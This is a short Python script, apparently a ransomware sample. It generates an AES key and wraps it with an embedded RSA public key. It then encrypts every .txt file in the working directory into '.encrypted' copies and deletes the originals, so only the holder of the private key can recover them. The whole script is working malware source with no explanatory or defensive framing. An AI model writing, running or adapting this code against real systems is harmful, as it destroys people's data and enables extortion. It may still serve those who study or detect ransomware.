import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

rsa_public_key = b"""-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAvzEmJoMbduj03XbaIUk7
woC9pM7gvtb9/vs5g95+FQL1jH+QdKaA2gRw92g5BNFV6GC9s5MLCaNFdjWQjf/4
9ptAQCzFBiE8OF/MmykBY1RraPJW1MVEkIdDRjtLXyepoGrHyQR/SnflYuqgf98l
Uwdc3XX0AbXNCOmX1KNXCQCt9Aeiq/SqKBZrom+oIrj+YP9a622I62+uO5BX4PuT
/WYfywAWpw7+ry8qRfLgO7U4WjVJ3sMxrN8X7hCHaGKHMh+i/cRNQGTB8dleIu+E
bRqazRx5VyO0dxc4ZOrO3Yh1tRBPGlFG8nKyswkqBMs/ccVVMOg6NW8oIW/f/cJ1
bxbAo9q5UeButjrNYIGpG6E5Uf2FCE5T2+N8c5cuf61IUhWKyGoxfkhCsRjeQEJh
+BI05RIakv4V96qXt594lg0NlsMaai3IpO1boCxNexbqetkZM+1SbQjca66HlRZf
xP43rM2XkuiB73KiIbpST/aJNQ5Kei+G1n7Gd2kUaOqPAgMBAAE=
-----END PUBLIC KEY-----"""
rsa_key = RSA.import_key(rsa_public_key)
rsa_cipher = PKCS1_OAEP.new(rsa_key)

aes_key = get_random_bytes(16)
encrypted_aes_key = rsa_cipher.encrypt(aes_key)
with open("EncryptedSharedKey", "wb") as f:
    f.write(encrypted_aes_key)

for file in os.listdir():
    if not file.endswith(".txt"): continue
    with open(file, "rb") as f:
        text = f.read()

    aes_cipher = AES.new(aes_key, AES.MODE_CBC)
    ciphertext = aes_cipher.encrypt(pad(text, AES.block_size))
    with open(file+".encrypted", "wb") as f:
        f.write(aes_cipher.iv)
        f.write(ciphertext)

    os.remove(file)
